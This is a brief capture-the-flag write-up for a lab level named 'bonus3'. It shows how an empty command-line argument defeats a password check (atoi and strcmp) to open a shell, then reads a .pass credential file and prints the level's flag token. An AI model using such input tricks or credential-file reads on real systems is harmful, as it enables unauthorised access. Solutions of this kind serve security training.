# bonus3

This level is extremely simple.  

By inspecting the code we can see two interesting lines:

```c
pass[atoi(argv[1])] = 0;
[...]
if (strcmp(pass, argv[1]) == 0)
[...]
```

We know that `atoi("")` is `0`. By passing nothing to `argv[1]`, `pass`'s first byte will also be equal to `\0`.  
The comparison will therefore be true and the program will execute the shell.

```sh
$> ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ cat /home/user/end/end
Congratulations graduate!
```
